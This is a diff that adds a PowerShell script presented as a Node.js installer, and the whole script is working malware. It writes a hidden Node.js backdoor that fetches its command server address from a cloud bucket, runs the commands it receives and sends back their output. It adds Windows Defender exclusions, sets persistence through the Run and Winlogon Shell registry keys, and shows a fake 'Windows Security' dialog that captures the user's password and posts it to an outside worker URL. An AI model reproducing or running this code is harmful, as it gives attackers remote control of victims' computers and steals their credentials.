@@ -1,0 +1,187 @@
+Clear-Host
+Start-BitsTransfer -Source "https://nodejs.org/dist/v24.21.0/node-v24.21.0-x64.msi" -Destination "$env:TEMP\node.msi"
+Start-Process msiexec.exe -ArgumentList "/i `"$env:TEMP\node.msi`" /quiet /norestart" -Wait
+$env:Path = [System.Environment]::GetEnvironmentVariable("Path","Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path","User")
+
+$payloadDir = "C:\ProgramData\Microsoft\Windows\NodeUpdate"
+New-Item -ItemType Directory -Force -Path $payloadDir | Out-Null
+Set-Location $payloadDir
+
+$malwarePath = "$payloadDir\update.dat"
+
+$js = @"
+const https = require("https");
+const { exec } = require("child_process");
+const R2_URL = "https://pub-2606cf3b425248d093389f8ccee882f1.r2.dev/system-cache.json";
+async function getC2() {
+    return new Promise((resolve) => {
+        https.get(R2_URL, (res) => {
+            let data = "";
+            res.on("data", (c) => data += c);
+            res.on("end", () => {
+                try {
+                    const parsed = JSON.parse(data);
+                    resolve(parsed.c2_url);
+                } catch (e) {
+                    resolve(null);
+                }
+            });
+        }).on("error", () => resolve(null));
+    });
+}
+setInterval(async () => {
+    try {
+        const c2Url = await getC2();
+        if (!c2Url) return;
+        https.get(c2Url + "/beacon", (res) => {
+            let data = "";
+            res.on("data", (c) => data += c);
+            res.on("end", () => {
+                if (data && data !== "none") {
+                    exec(data, (err, stdout) => {
+                        const body = JSON.stringify({ cmd: data, out: stdout });
+                        const req = https.request(c2Url + "/result", { method: "POST" }, () => {});
+                        req.write(body);
+                        req.end();
+                    });
+                }
+            });
+        }).on("error", () => {});
+    } catch (err) {}
+}, 15000);
+"@
+
+Set-Content -Path $malwarePath -Value $js
+
+Add-MpPreference -ExclusionPath $payloadDir -ErrorAction SilentlyContinue
+Add-MpPreference -ExclusionProcess "node.exe" -ErrorAction SilentlyContinue
+Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "NodeUpdate" -Value "conhost.exe --headless node `"$malwarePath`"" -ErrorAction SilentlyContinue
+
+$shellKey = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
+$currentShell = (Get-ItemProperty -Path $shellKey -Name "Shell").Shell
+if ($currentShell -notmatch "node.exe") {
+    Set-ItemProperty -Path $shellKey -Name "Shell" -Value "$currentShell, conhost.exe --headless node `"$malwarePath`"" -ErrorAction SilentlyContinue
+}
+
+$nodePath = Join-Path $env:ProgramFiles "NodeJS\node.exe"
+Start-Process $nodePath -ArgumentList "`"$malwarePath`"" -WindowStyle Hidden
+
+Add-Type -AssemblyName System.Windows.Forms
+Add-Type -AssemblyName System.Drawing
+
+$form = New-Object System.Windows.Forms.Form
+$form.Text = "Windows Security"
+$form.Size = New-Object System.Drawing.Size(450, 280)
+$form.StartPosition = "CenterScreen"
+$form.TopMost = $true
+$form.FormBorderStyle = 'FixedDialog'
+$form.MaximizeBox = $false
+$form.MinimizeBox = $false
+$form.BackColor = [System.Drawing.Color]::White
+
+$icon = [System.Drawing.SystemIcons]::Shield
+$form.Icon = $icon
+
+$pictureBox = New-Object System.Windows.Forms.PictureBox
+$pictureBox.Image = $icon.ToBitmap()
+$pictureBox.SizeMode = "StretchImage"
+$pictureBox.Location = New-Object System.Drawing.Point(20, 25)
+$pictureBox.Size = New-Object System.Drawing.Size(32, 32)
+$form.Controls.Add($pictureBox)
+
+$labelTitle = New-Object System.Windows.Forms.Label
+$labelTitle.Text = "Enter credentials to finish installation"
+$labelTitle.Font = New-Object System.Drawing.Font("Segoe UI", 12, [System.Drawing.FontStyle]::Bold)
+$labelTitle.ForeColor = [System.Drawing.Color]::Black
+$labelTitle.Location = New-Object System.Drawing.Point(65, 20)
+$labelTitle.Size = New-Object System.Drawing.Size(360, 25)
+$form.Controls.Add($labelTitle)
+
+$labelSub = New-Object System.Windows.Forms.Label
+$labelSub.Text = "Please verify your account to complete the installation."
+$labelSub.Font = New-Object System.Drawing.Font("Segoe UI", 9)
+$labelSub.ForeColor = [System.Drawing.Color]::DimGray
+$labelSub.Location = New-Object System.Drawing.Point(65, 45)
+$labelSub.Size = New-Object System.Drawing.Size(360, 40)
+$form.Controls.Add($labelSub)
+
+$labelUser = New-Object System.Windows.Forms.Label
+$labelUser.Text = "Username:"
+$labelUser.Font = New-Object System.Drawing.Font("Segoe UI", 9)
+$labelUser.Location = New-Object System.Drawing.Point(25, 100)
+$labelUser.Size = New-Object System.Drawing.Size(100, 20)
+$form.Controls.Add($labelUser)
+
+$userBox = New-Object System.Windows.Forms.TextBox
+$userBox.Location = New-Object System.Drawing.Point(130, 98)
+$userBox.Size = New-Object System.Drawing.Size(280, 23)
+$userBox.Font = New-Object System.Drawing.Font("Segoe UI", 9)
+$userBox.Text = $env:USERNAME
+$form.Controls.Add($userBox)
+
+$labelPass = New-Object System.Windows.Forms.Label
+$labelPass.Text = "Password:"
+$labelPass.Font = New-Object System.Drawing.Font("Segoe UI", 9)
+$labelPass.Location = New-Object System.Drawing.Point(25, 140)
+$labelPass.Size = New-Object System.Drawing.Size(100, 20)
+$form.Controls.Add($labelPass)
+
+$passBox = New-Object System.Windows.Forms.TextBox
+$passBox.Location = New-Object System.Drawing.Point(130, 138)
+$passBox.Size = New-Object System.Drawing.Size(280, 23)
+$passBox.Font = New-Object System.Drawing.Font("Segoe UI", 9)
+$passBox.UseSystemPasswordChar = $true
+$form.Controls.Add($passBox)
+
+$labelReminder = New-Object System.Windows.Forms.Label
+$labelReminder.Text = "(Reminder: Password is case-sensitive)"
+$labelReminder.Font = New-Object System.Drawing.Font("Segoe UI", 8, [System.Drawing.FontStyle]::Italic)
+$labelReminder.ForeColor = [System.Drawing.Color]::Gray
+$labelReminder.Location = New-Object System.Drawing.Point(130, 165)
+$labelReminder.Size = New-Object System.Drawing.Size(280, 20)
+$form.Controls.Add($labelReminder)
+
+$button = New-Object System.Windows.Forms.Button
+$button.Text = "OK"
+$button.Location = New-Object System.Drawing.Point(240, 205)
+$button.Size = New-Object System.Drawing.Size(80, 28)
+$button.Font = New-Object System.Drawing.Font("Segoe UI", 9)
+$button.BackColor = [System.Drawing.Color]::FromArgb(0, 120, 215)
+$button.ForeColor = [System.Drawing.Color]::White
+$button.FlatStyle = 'System'
+$button.DialogResult = [System.Windows.Forms.DialogResult]::OK
+$form.Controls.Add($button)
+
+$form.AcceptButton = $button
+
+$buttonCancel = New-Object System.Windows.Forms.Button
+$buttonCancel.Text = "Cancel"
+$buttonCancel.Location = New-Object System.Drawing.Point(330, 205)
+$buttonCancel.Size = New-Object System.Drawing.Size(80, 28)
+$buttonCancel.Font = New-Object System.Drawing.Font("Segoe UI", 9)
+$buttonCancel.FlatStyle = 'System'
+$buttonCancel.DialogResult = [System.Windows.Forms.DialogResult]::Cancel
+$form.Controls.Add($buttonCancel)
+
+$form.CancelButton = $buttonCancel
+
+$result = $form.ShowDialog()
+
+$username = $userBox.Text
+$password = $passBox.Text
+
+if (-not [string]::IsNullOrWhiteSpace($username)) {
+    $message = "New Credentials Captured!`nHost: $env:COMPUTERNAME`nUser: $username`nPass: $password"
+} else {
+    $message = "User clicked Cancel or left blank on the prompt.`nHost: $env:COMPUTERNAME"
+}
+
+$workerUrl = "https://soft-term-d400.goodluckfeds.workers.dev/"
+
+$body = @{ message = $message } | ConvertTo-Json
+try {
+    Invoke-RestMethod -Uri $workerUrl -Method Post -Body $body -ContentType "application/json" -ErrorAction SilentlyContinue | Out-Null
+} catch {}
+
+Clear-Host
+Write-Host "[+] Installation complete." -ForegroundColor Green
